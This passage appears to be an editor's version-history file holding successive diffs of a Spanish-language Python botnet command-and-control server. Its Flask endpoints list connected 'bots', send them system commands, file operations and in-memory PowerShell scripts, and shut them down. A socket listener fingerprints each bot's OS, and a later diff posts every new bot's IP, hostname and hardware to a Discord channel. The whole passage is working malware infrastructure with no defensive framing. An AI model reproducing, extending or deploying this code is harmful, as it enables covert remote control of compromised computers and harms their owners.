sistemas_operativos[conn]\r\n+\r\n+@app.route('/listar_bots', methods=['GET'])\r\n+def listar_bots():\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n+    try:\r\n+        active_bots = db.get_active_bots() if db else []\r\n+        if active_bots:\r\n+            return jsonify([{\r\n+                \"id\": bot[\"id\"],\r\n+                \"so\": json.loads(bot[\"system_info\"]).get(\"os\", \"Unknown\"),  # Extraer OS del JSON\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": json.loads(bot[\"system_info\"]).get(\"hostname\", f\"bot_{bot['id']}\"),  # Extraer hostname del JSON\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en listar_bots: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/enviar_comando', methods=['POST'])\r\n+def enviar_comando():\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        if not data:\r\n+            return jsonify({\"error\": \"No se recibieron datos\"}), 400\r\n+            \r\n+        if not bots:\r\n+            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+\r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            try:\r\n+                if bot not in sistemas_operativos:\r\n+                    app.logger.warning(f\"Bot sin sistema operativo detectado\")\r\n+                    continue\r\n+                    \r\n+                comando = data.get(\"comando_windows\") if sistemas_operativos[bot] == \"windows\" else data.get(\"comando_linux\")\r\n+                if not comando:\r\n+                    continue\r\n+                    \r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids.get(bot)\r\n+                if not bot_id:\r\n+                    continue\r\n+                \r\n+                # Esperar respuesta con timeout\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n+            except Exception as e:\r\n+                app.logger.error(f\"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}\")\r\n+                continue\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en enviar_comando: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/shutdown', methods=['POST'])\r\n+def shutdown():\r\n+    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        server_running = False\r\n+        for bot in bots[:]:\r\n+            try:\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n+                bot.close()\r\n+            except:\r\n+                pass\r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n+        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        if not config:\r\n+            raise ValueError(\"No se pudo cargar la configuraci√≥n\")\r\n+            \r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        host = config.get(\"NETWORK\", \"HOST\", fallback=\"127.0.0.1\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\", fallback=5001)\r\n+        \r\n+        server.bind((host, port))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n+        \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        app.logger.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n+        return True\r\n+        \r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+# Configurar logging m√°s detallado\r\n+app.logger.setLevel(logging.DEBUG)\r\n+handler = logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"flask_debug.log\"))\r\n+handler.setLevel(logging.DEBUG)\r\n+app.logger.addHandler(handler)\r\n+\r\n+@app.errorhandler(500)\r\n+def handle_500_error(e):\r\n+    app.logger.error(f'Error interno del servidor: {str(e)}')\r\n+    return jsonify({\r\n+        \"error\": \"Error interno del servidor\",\r\n+        \"details\": str(e)\r\n+    }), 500\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n+            config = cargar_configuracion()\r\n+            api_port = config.getint(\"NETWORK\", \"API_PORT\", fallback=5000)\r\n+            print(f\"[*] Servidor web escuchando en http://127.0.0.1:{api_port}\")\r\n+            \r\n+            # Configurar Flask para producci√≥n\r\n+            app.config['ENV'] = 'production'\r\n+            app.config['DEBUG'] = False\r\n+            \r\n+            # Iniciar Flask\r\n+            app.run(\r\n+                host=\"127.0.0.1\", \r\n+                port=api_port, \r\n+                debug=False, \r\n+                use_reloader=False,\r\n+                threaded=True\r\n+            )\r\n+        else:\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740304585446,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,397 @@\n+from datetime import datetime\r\n+import json\r\n+from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n+\r\n+app = Flask(__name__)\r\n+\r\n+# Variables globales\r\n+bots = []\r\n+bot_ids = {}\r\n+sistemas_operativos = {}\r\n+respuestas_bots = {}\r\n+server_running = True\r\n+\r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager()  # Ya no pasamos la ruta, usar√° la predeterminada\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        # Esperar identificaci√≥n del bot\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n+            conn.close()\r\n+            return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_info={\"os\": sistema, \"full_info\": os_info},\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n+                respuestas_bots[bot_id] = data\r\n+                \r\n+            except:\r\n+                break\r\n+                \r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+\r\n+@app.route('/listar_bots', methods=['GET'])\r\n+def listar_bots():\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n+    try:\r\n+        active_bots = db.get_active_bots() if db else []\r\n+        if active_bots:\r\n+            return jsonify([{\r\n+                \"id\": bot[\"id\"],\r\n+                \"so\": json.loads(bot[\"system_info\"]).get(\"os\", \"Unknown\"),  # Extraer OS del JSON\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": json.loads(bot[\"system_info\"]).get(\"hostname\", f\"bot_{bot['id']}\"),  # Extraer hostname del JSON\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en listar_bots: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/enviar_comando', methods=['POST'])\r\n+def enviar_comando():\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        if not data:\r\n+            return jsonify({\"error\": \"No se recibieron datos\"}), 400\r\n+            \r\n+        if not bots:\r\n+            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+\r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            try:\r\n+                if bot not in sistemas_operativos:\r\n+                    app.logger.warning(f\"Bot sin sistema operativo detectado\")\r\n+                    continue\r\n+                    \r\n+                comando = data.get(\"comando_windows\") if sistemas_operativos[bot] == \"windows\" else data.get(\"comando_linux\")\r\n+                if not comando:\r\n+                    continue\r\n+                    \r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids.get(bot)\r\n+                if not bot_id:\r\n+                    continue\r\n+                \r\n+                # Esperar respuesta con timeout\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n+            except Exception as e:\r\n+                app.logger.error(f\"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}\")\r\n+                continue\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en enviar_comando: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/shutdown', methods=['POST'])\r\n+def shutdown():\r\n+    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        server_running = False\r\n+        for bot in bots[:]:\r\n+            try:\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n+                bot.close()\r\n+            except:\r\n+                pass\r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n+        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        if not config:\r\n+            raise ValueError(\"No se pudo cargar la configuraci√≥n\")\r\n+            \r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        host = config.get(\"NETWORK\", \"HOST\", fallback=\"127.0.0.1\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\", fallback=5001)\r\n+        \r\n+        server.bind((host, port))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n+        \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        app.logger.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n+        return True\r\n+        \r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+# Configurar logging m√°s detallado\r\n+app.logger.setLevel(logging.DEBUG)\r\n+handler = logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"flask_debug.log\"))\r\n+handler.setLevel(logging.DEBUG)\r\n+app.logger.addHandler(handler)\r\n+\r\n+@app.errorhandler(500)\r\n+def handle_500_error(e):\r\n+    app.logger.error(f'Error interno del servidor: {str(e)}')\r\n+    return jsonify({\r\n+        \"error\": \"Error interno del servidor\",\r\n+        \"details\": str(e)\r\n+    }), 500\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n+            config = cargar_configuracion()\r\n+            api_port = config.getint(\"NETWORK\", \"API_PORT\", fallback=5000)\r\n+            print(f\"[*] Servidor web escuchando en http://127.0.0.1:{api_port}\")\r\n+            \r\n+            # Configurar Flask para producci√≥n\r\n+            app.config['ENV'] = 'production'\r\n+            app.config['DEBUG'] = False\r\n+            \r\n+            # Iniciar Flask\r\n+            app.run(\r\n+                host=\"127.0.0.1\", \r\n+                port=api_port, \r\n+                debug=False, \r\n+                use_reloader=False,\r\n+                threaded=True\r\n+            )\r\n+        else:\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740306187041,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -128,9 +128,9 @@\n         \r\n         logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n         \r\n         # Agregar a las estructuras en memoria\r\n-            pass\r\n+        sistemas_operativos[conn] = sistema\r\n             \r\n         conn.close()\r\n         if conn in bots:\r\n             bots.remove(conn)\r\n"
                },
                {
                    "date": 1740307303671,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -88,8 +88,26 @@\n         requests.post(webhook_url, json={\"embed\": embed})\r\n     except Exception as e:\r\n         logging.error(f\"Error enviando notificaci√≥n a Discord: {e}\")\r\n \r\n+def notificar_discord(titulo, descripcion, color=0x3498db, fields=None):\r\n+    \"\"\"Env√≠a una notificaci√≥n al canal de Discord espec√≠fico.\"\"\"\r\n+    try:\r\n+        channel_id = 1342904780506398781\r\n+        webhook_url = f\"{API_URL}/discord_notify/{channel_id}\"\r\n+        \r\n+        embed = {\r\n+            \"title\": titulo,\r\n+            \"description\": descripcion,\r\n+            \"color\": color,\r\n+            \"timestamp\": datetime.now().isoformat(),\r\n+            \"fields\": fields or []\r\n+        }\r\n+        \r\n+        requests.post(webhook_url, json={\"embed\": embed})\r\n+    except Exception as e:\r\n+        logging.error(f\"Error enviando notificaci√≥n a Discord: {e}\")\r\n+\r\n def manejar_bot(conn, addr, bot_id):\r\n     \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n     try:\r\n         # Esperar identificaci√≥n del bot\r\n@@ -99,23 +117,38 @@\n             return\r\n             \r\n         # Detectar sistema operativo\r\n         conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        sistema = json.loads(os_info)\r\n         \r\n-        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n+        # Registrar bot en la base de datos\r\n         db_bot_id = db.register_bot(\r\n             unique_id=identificador,\r\n             ip_address=addr[0],\r\n-            system_info={\"os\": sistema, \"full_info\": os_info},\r\n-            hostname=f\"bot_{bot_id}\",\r\n+            system_info=sistema,\r\n+            hostname=sistema.get(\"hostname\", f\"bot_{bot_id}\"),\r\n             additional_info={\r\n                 \"port\": addr[1],\r\n                 \"connection_time\": datetime.now().isoformat()\r\n             }\r\n         )\r\n         \r\n+        # Enviar notificaci√≥n a Discord\r\n+        notificar_discord(\r\n+            titulo=\"üîµ Nuevo Bot Conectado\",\r\n+            descripcion=\"Se ha conectado un nuevo bot al servidor C&C\",\r\n+            color=0x3498db,  # Azul\r\n+            fields=[\r\n+                {\"name\": \"ID\", \"value\": str(db_bot_id), \"inline\": True},\r\n+                {\"name\": \"Sistema Operativo\", \"value\": sistema.get(\"os\", \"Desconocido\"), \"inline\": True},\r\n+                {\"name\": \"Hostname\", \"value\": sistema.get(\"hostname\", \"Desconocido\"), \"inline\": True},\r\n+                {\"name\": \"IP\", \"value\": addr[0], \"inline\": True},\r\n+                {\"name\": \"Versi√≥n\", \"value\": sistema.get(\"version\", \"Desconocida\"), \"inline\": True},\r\n+                {\"name\": \"Procesador\", \"value\": sistema.get(\"processor\", \"Desconocido\"), \"inline\": True}\r\n+            ]\r\n+        )\r\n+        \r\n         # Obtener informaci√≥n completa del bot para la notificaci√≥n\r\n         bot_info = {\r\n             \"id\": db_bot_id,\r\n             \"ip_address\": addr[0],\r\n"
                }
            ],
            "date": 1740259769964,
            "name": "Commit-0",
            "content": "from flask import Flask, jsonify, request\r\n\r\napp = Flask(__name__)\r\n\r\n# Variables globales\r\nbots = []\r\nbot_ids = {}\r\nsistemas_operativos = {}\r\nrespuestas_bots = {}\r\n\r\n@app.route('/listar_bots', methods=['GET'])\r\ndef listar_bots():\r\n    \"\"\"Lista todos los bots conectados al servidor C&C.\"\"\"\r\n    try:\r\n        if bots:\r\n            bots_info = []\r\n            for bot in bots:\r\n                so = sistemas_operativos.get(bot, \"Desconocido\")\r\n                bots_info.append({\r\n                    \"id\": bot_ids[bot],\r\n                    \"so\": so.capitalize(),\r\n                    \"direccion\": bot.getpeername()\r\n                })\r\n            return jsonify(bots_info)\r\n        else:\r\n            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n    except Exception as e:\r\n        return jsonify({\"error\": str(e)}), 500\r\n\r\n@app.route('/enviar_comando', methods=['POST'])\r\ndef enviar_comando():\r\n    \"\"\"Env√≠a un comando a los bots conectados.\"\"\"\r\n    try:\r\n        data = request.json\r\n        comando_windows = data.get(\"comando_windows\")\r\n        comando_linux = data.get(\"comando_linux\")\r\n        \r\n        if not bots:\r\n            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n\r\n        respuestas = {}\r\n        for bot in bots:\r\n            so = sistemas_operativos.get(bot, \"desconocido\")\r\n            comando = comando_windows if so == \"windows\" else comando_linux\r\n            try:\r\n                bot.send(comando.encode('utf-8'))\r\n            except:\r\n                continue\r\n        \r\n        return jsonify({\"message\": \"Comando enviado correctamente\"})\r\n    except Exception as e:\r\n        return jsonify({\"error\": str(e)}), 500\r\n\r\n@app.route('/shutdown', methods=['POST'])\r\ndef shutdown():\r\n    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n    try:\r\n        for bot in bots[:]:\r\n            try:\r\n                bot.send(\"shutdown\".encode('utf-8'))\r\n                bot.close()\r\n                bots.remove(bot)\r\n            except:\r\n                pass\r\n        \r\n        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n    except Exception as e:\r\n        return jsonify({\"error\": str(e)}), 500\r\n"
        }
    ]
}